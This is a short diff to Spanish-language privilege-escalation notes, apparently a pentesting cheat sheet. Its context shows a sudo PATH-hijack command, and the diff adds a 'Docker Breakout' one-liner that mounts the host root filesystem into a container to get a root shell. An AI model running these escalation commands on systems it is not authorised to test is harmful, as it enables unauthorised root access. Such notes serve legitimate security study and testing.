@@ -58,3 +58,6 @@ Usuarios con capacidad de:\
 Se puede crear un binario propio y ejecutar el binario/script privilegiado con:\
 ```sudo PATH=$PWD:$PATH [Binario con privilegios en sudo -l]```
 
+Docker Breakout\
+```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```
+
